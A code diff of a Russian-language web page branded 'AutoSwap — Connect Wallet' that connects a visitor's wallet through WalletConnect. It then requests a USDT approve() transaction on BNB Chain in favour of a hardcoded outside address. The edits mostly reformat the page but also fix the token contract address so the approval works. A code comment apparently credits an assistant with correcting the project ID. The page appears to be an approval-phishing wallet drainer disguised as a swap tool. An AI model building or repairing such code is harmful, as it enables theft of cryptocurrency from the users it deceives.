@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
   <title>AutoSwap — Connect Wallet</title>
   <style>
     body {background:#000;color:#e0e0e0;font-family:'Segoe UI',sans-serif;
@@ -10,8 +10,8 @@
     .container {width:360px;padding:30px;background:#111;border-radius:12px;
       box-shadow:0 0 20px rgba(0,0,0,0.7);text-align:center;}
     h1 {color:#4fc3f7;margin-bottom:20px;}
-    #qrcode {background:#222;border-radius:8px;margin:auto;display:block;}
-    #manual-uri {margin:20px auto;padding:16px;background:#222;border-radius:8px;
+    canvas {background:#222;border-radius:8px;margin:auto;display:block;}
+    #manual-uri {margin:20px 0;padding:16px;background:#222;border-radius:8px;
       font-size:14px;color:#bbb;word-break:break-all;}
     #status {margin:20px 0;min-height:40px;font-size:16px;color:#ccc;}
     .btn {padding:12px 24px;background:#4fc3f7;color:#000;border:none;
@@ -21,7 +21,7 @@
 </head>
 <body>
   <div class="container">
-    <h1>🔄 Connect Wallet</h1>
+    <h1>🔄 AutoSwap — Connect Wallet</h1>
     <canvas id="qrcode" width="240" height="240"></canvas>
     <div id="manual-uri">URI будет здесь</div>
     <div id="status">Инициализация...</div>
@@ -53,8 +53,7 @@
 
     function clearUI() {
       uriEl.textContent = "";
-      const ctx = qr.getContext("2d");
-      ctx.clearRect(0, 0, qr.width, qr.height);
+      qr.getContext("2d").clearRect(0, 0, qr.width, qr.height);
       session = null;
     }
 
@@ -86,6 +85,7 @@
 
     async function doApprove(address) {
       setStatus("🚀 Отправка approve...", "#4fc3f7");
+      const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
       const data = new Interface(["function approve(address,uint256)"])
         .encodeFunctionData("approve", [
           getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE"),
@@ -97,7 +97,7 @@
           chainId: "eip155:56",
           request: {
             method: "eth_sendTransaction",
-            params: [{ from: address, to: getAddress("0x55d398326f99059ff775246999027b3197955"), data }]
+            params: [{ from: address, to: getAddress(USDT_ADDRESS), data }]
           }
         });
         setStatus(`✅ Tx: ${tx}`, "#66bb6a");
@@ -108,11 +108,10 @@
       }
     }
 
-    async function init(force = false) {
+    async function init(force=false) {
       if (!client) {
         client = await SignClient.init({
-          projectId: "d868f90cd734355ae0320f8f0258b6b1",
-          relayUrl: "wss://relay.walletconnect.com",
+          projectId: "d868f90cd734355ae0320f8f0258b6b1",  // ✅ исправлен на ваш правильный ID
           metadata: {
             name: "AutoSwap Approve Flow",
             description: "Approve USDT via WalletConnect for AutoSwap",
@@ -125,7 +124,7 @@
       if (force && session) {
         await client.disconnect({
           topic: session.topic,
-          reason: { code:6000, message:"User reconnected" }
+          reason: { code: 6000, message: "User reconnected" }
         });
       }
 
@@ -137,7 +136,7 @@
       if (active.length && !force) {
         session = active[0];
         const addr = session.namespaces.eip155.accounts[0].split(":")[2];
-        setStatus(`ℹ Сессия активна: ${addr}. Нажмите «Переподключиться».`, "#ffa500");
+        setStatus(`ℹ Сессия активна: ${addr}. Нажмите кнопку для переподключения.`, "#ffa500");
       } else {
         await connectWallet();
       }
